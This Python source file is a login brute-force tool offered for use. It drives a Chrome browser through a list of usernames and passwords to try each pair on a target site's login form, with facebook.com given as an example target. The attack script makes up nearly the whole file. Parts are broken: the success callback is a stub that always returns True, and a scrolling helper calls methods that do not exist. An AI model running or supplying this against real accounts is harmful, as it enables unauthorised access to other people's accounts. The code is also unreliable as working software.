"""
app.py
Login Brute Force
@author: Primo <primo-universe@pm.me> (https://primo-businesses.blogspot.com/).
@license: BSD 2-Clause License. (Please read the "LICENSE" file for more details)
@copyright: Copyright (c) 2021. All rights reserved.
"""
# ---------------> Import <-----------------
import os, time, sys, json, logging
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
# ---------------> Env <-----------------
os.environ["DEBUSSY"] = "1"
# ---------------> Log <-----------------
LOG_FILE = 'logs/1.log'
logging.basicConfig(format='%(asctime)s %(levelname)s: %(message)s', datefmt='%Y/%m/%d %I:%M:%S %p', filename=LOG_FILE, level=logging.INFO)
def write_log(msg):
    print(msg)
    logging.info(msg)
# ---------------> Configure Browser <-----------------
class Browser(object):
    def __init__(self):
        super(Browser, self).__init__()
        self.options = self.options_()
    def options_(self):
        opts = Options()
        opts.add_argument("--mute-audio")
        opts.add_argument("--disable-infobars")
        opts.add_argument("--disable-notifications")
        return opts
    def web(self):
        return webdriver.Chrome(options=self.options)
browser_ = Browser()
# ---------------> Core <-----------------
def took_time(start_time, _method='Method'):
    end_time = time.time() - start_time
    print("[>]",_method,"took",str(end_time),"s")
    return end_time

def write_file(filename):
    return open(filename, 'wt', newline='', encoding='utf-8')

def read_file(filename):
    return open(filename, 'rt', newline='', encoding='utf-8')

def getListFromFile(list_filename):
    with read_file(list_filename) as file:
        content = file.read()
        j = json.loads(content)
        return j
# ---------------> Login brute force <-----------------
def BruteForce(url, _list, form_user, form_pw, form_login, callback_to_check = None):
    index = 1
    start_time = time.time()
    list_ = getListFromFile(_list)
    browser = browser_.web()
    for x in list_:
        user = x['user']
        password = x['password']
        browser.get(url)
        print("")
        write_log("[*] Login Attempt #{} to \'{}\'".format(str(index), url))
        write_log("[>] User: \'{}\', Password: \'{}\'".format(user, password))
        browser.find_element_by_name(form_user).send_keys(user)
        browser.find_element_by_name(form_pw).send_keys(password)
        browser.find_element_by_name(form_login).click()
        if callback_to_check is not None:
            if callback_to_check(x) is True:
                print("[+] Successful Login")
                break
        time.sleep(1)
        index += 1
    took_time(start_time, "Login Brute Force")
# ---------------> Scroll to the bottom of the page <-----------------
def scroll_to_bottom(css_selector):
    try:
        while Browser().find_element_by_css_selector(css_selector):
            Browser().execute_script("window.scrollTo(0, document.body.scrollHeight);")
            time.sleep(0.2)
    except:
        pass
# ---------------> Before Main <-----------------
def first_char(text):
    return text[0].lower()

def args():
    import argparse
    parser = argparse.ArgumentParser(description='Login Brute Force')
    parser.add_argument('-u', '--url', help='Website URL (e.g. https://facebook.com)', required=True)
    parser.add_argument('-l', '--list', help='User and Password List Filename (e.g. lists/list-1.json)', required=True)
    parser.add_argument('-fu', '--form-user', help='Input Name of User (e.g. email)', required=True)
    parser.add_argument('-fp', '--form-password', help='Input Name of Password (e.g. password)', required=True)
    parser.add_argument('-fl', '--form-login', help='Input Name of the Login Button (e.g. login)', required=True)
    args = parser.parse_args()
    return args
# ---------------> Callback <---------------
# you have to enter the callback to check if the user and password is valid or not,
# and then you have to return True
# TODO
def myCallback(item):
    return True
# ---------------> Main <---------------
def RunBruteForceWithArgs(args, callback=None):
    return BruteForce(args.url, args.list, args.form_user, args.form_password, args.form_login, callback)

def AskToRunBruteForce(callback=None):
    print("===> Please enter the details below (all are required) <===")
    _url = input("[?] Website URL (e.g. https://facebook.com)> ")
    _list = input("[?] User and Password List Filename (e.g. lists/list-1.json)> ")
    _form_user = input("[?] Input Name of the User Field (e.g. email)> ")
    _form_password = input("[?] Input Name of the Password Field (e.g. password)> ")
    _form_login = input("[?] Input Name of the Login Button (e.g. login)> ")
    return BruteForce(_url, _list, _form_user, _form_password, _form_login, callback)

def main():
    full_start_time = time.time()
    print("")
    if len(sys.argv) > 1:
        RunBruteForceWithArgs(args(), myCallback)
    else:
        AskToRunBruteForce(myCallback)
    print("")
    took_time(full_start_time, "Application")
# ---------------> Test <---------------
def test():
    x = "swrw"
    y = str(2343)
    write_log("[>] User: \'{}\', Password: \'{}\'".format(x, y))
    print(getListFromFile("lists/list-1.json"))
# ---------------> Entry Point <---------------
if __name__ == '__main__':
    main()
    # test()